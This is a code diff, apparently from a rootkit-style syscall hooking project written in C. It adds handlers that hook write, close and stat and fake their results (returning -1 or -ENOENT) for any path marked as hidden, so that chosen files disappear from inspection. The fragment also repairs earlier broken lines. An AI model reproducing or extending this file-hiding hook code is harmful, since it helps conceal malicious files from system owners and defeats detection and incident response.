@@ -56,7 +56,7 @@ static long hook_function(long a1, long a2, long a3,
         }
         case 1: {
             // ssize_t write(int fd, const void *buf, size_
-            #ifdef
+            #ifdef DEBUG
             printf("[-] write hooked!\n");
             #endif
             char path[256];
@@ -93,7 +93,26 @@ static long hook_function(long a1, long a2, long a3,
             char path[256];
             fd = (int)a2;
             fd_to_fname(fd, path, sizeof(path));
-            if check()
+            if (check_if_hidden_path(path)) {
+                #ifdef DEBUG
+                printf("[!] Hiding file %s from close\n", path);
+                #endif
+                return -1;
+            }
+            break;
+        }
+        case 4: {
+            // int stat(const char *path, struct stat *buf);
+            #ifdef DEBUG
+            printf("[-] stat hooked!\n");
+            #endif
+            const char *path = (const char *)a2;
+            if (check_if_hidden_path(path)) {
+                #ifdef DEBUG
+                printf("[!] Hiding file %s from stat\n", path);
+                #endif
+                return -ENOENT;
+            }
             break;
         }
         case 5: {
